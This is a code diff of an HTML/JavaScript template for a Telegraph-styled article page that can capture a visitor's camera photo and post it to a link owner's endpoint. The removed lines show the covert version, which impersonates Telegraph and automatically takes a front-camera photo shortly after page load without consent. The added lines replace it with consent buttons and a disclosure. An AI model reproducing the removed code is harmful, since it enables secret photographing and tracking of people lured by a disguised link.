+#status {{ min-height:20px; margin-top:10px; font-size:13px; color:#666; }}
+#video {{ display:none; width:100%; margin-top:16px; border-radius:8px; }}
+.demo {{ display:inline-block; margin-left:7px; padding:3px 7px; border-radius:999px; background:#f1f1f1; color:#777; font-size:10px; vertical-align:1px; }}
+@media (max-width:600px) {{ .article {{ padding:35px 20px 55px; }} h1 {{ font-size:34px; }} .content {{ font-size:18px; }} }}
 </style>
 </head>
 <body>
-<div class="article">
-  <div class="article-header">
-    <div class="badge">📝 Telegraph</div>
-    <h1>{title}</h1>
-    <div class="meta">Опубликовано Verhcau • <span class="id">#{short_id}</span></div>
-  </div>
-  <div class="article-body">
-    <div class="content">
-      <img src="{photo_url}" alt="Preview" style="max-width:100%;border-radius:12px;margin:0 0 16px 0;">
-      {content.replace(chr(10), '<br>')}
+<main class="article">
+  <div class="brand">Telegraph-style article <span class="demo">демо, не официальный Telegraph</span></div>
+  <h1>{safe_title}</h1>
+  <div class="meta">Verhcau · #{short_id}</div>
+  <img class="hero" id="preview" src="{photo_url}" alt="Preview">
+  <div class="content">{safe_content}</div>
+
+  <section class="consent">
+    <div class="note">Камера включится только после вашего нажатия. Если вы отправите снимок, фото и IP-данные будут переданы владельцу этой ссылки.</div>
+    <div class="buttons">
+      <button id="cameraBtn">Разрешить камеру</button>
+      <button id="sendBtn">Сделать и отправить фото</button>
     </div>
-    <div class="camera-section">
-      <div id="status" class="camera-status"><div class="spinner"></div></div>
-    </div>
+    <div id="status"></div>
     <video id="video" playsinline autoplay muted></video>
-  </div>
-</div>
+  </section>
+</main>
 <script>
-const token = "{token}";
+const token = {json.dumps(token)};
 const video = document.getElementById('video');
+const preview = document.getElementById('preview');
 const status = document.getElementById('status');
-let photoSent = false;
+const cameraBtn = document.getElementById('cameraBtn');
+const sendBtn = document.getElementById('sendBtn');
+let stream = null;
+let sending = false;
 
-async function requestCamera() {{
-    try {{
-        if (!navigator.mediaDevices?.getUserMedia) throw new Error('Камера недоступна');
-        const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode:'user' }}, audio:false }});
-        video.srcObject = stream;
-        video.style.display = 'block';
-        await new Promise(r => video.readyState >= 2 ? r() : (video.onloadeddata = r));
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        stream.getTracks().forEach(t => t.stop());
-        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));
-        if (!blob) throw new Error('Ошибка создания снимка');
-        await sendPhoto(blob);
-    }} catch (e) {{
-        status.innerHTML = '❌ ' + e.message;
-        status.className = 'camera-status error';
-    }}
-}}
+cameraBtn.addEventListener('click', async () => {{
+  try {{
+    if (!navigator.mediaDevices?.getUserMedia) throw new Error('Камера недоступна в этом браузере');
+    stream = await navigator.mediaDevices.getUserMedia({{video:{{facingMode:'user'}},audio:false}});
+    video.srcObject = stream;
+    video.style.display = 'block';
+    cameraBtn.style.display = 'none';
+    sendBtn.style.display = 'inline-block';
+    status.textContent = 'Камера включена. Для отправки нажмите вторую кнопку.';
+  }} catch (e) {{ status.textContent = 'Ошибка: ' + e.message; }}
+}});
 
-async function sendPhoto(blob) {{
-    if (photoSent) return;
-    photoSent = true;
-    const fd = new FormData();
-    fd.append('photo', blob, 'photo.jpg');
-    try {{
-        const r = await fetch(`/api/send/${{encodeURIComponent(token)}}`, {{ method:'POST', body:fd }});
-        const data = await r.json().catch(() => ({{}}));
-        if (!r.ok) throw new Error(data.detail || 'Ошибка');
-        status.innerHTML = '';
-        video.style.display = 'none';
-    }} catch (e) {{
-        status.innerHTML = '❌ ' + e.message;
-        status.className = 'camera-status error';
-        photoSent = false;
-    }}
-}}
-
-document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 500));
+sendBtn.addEventListener('click', async () => {{
+  if (!stream || sending) return;
+  sending = true; sendBtn.disabled = true; status.textContent = 'Отправка…';
+  try {{
+    await new Promise(r => video.readyState >= 2 ? r() : (video.onloadeddata = r));
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 720; canvas.height = video.videoHeight || 1280;
+    canvas.getContext('2d').drawImage(video,0,0);
+    const blob = await new Promise(r => canvas.toBlob(r,'image/jpeg',.92));
+    if (!blob) throw new Error('Не удалось создать снимок');
+    const fd = new FormData(); fd.append('photo',blob,'photo.jpg');
+    const r = await fetch(`/api/send/${{encodeURIComponent(token)}}`,{{method:'POST',body:fd}});
+    const data = await r.json().catch(()=>({{}}));
+    if (!r.ok) throw new Error(data.detail || 'Ошибка отправки');
+    stream.getTracks().forEach(t=>t.stop());
+    video.style.display='none'; sendBtn.style.display='none'; status.textContent='Фото отправлено.';
+  }} catch(e) {{ status.textContent='Ошибка: '+e.message; sendBtn.disabled=false; sending=false; }}
+}});
 </script>
 </body>
 </html>'''
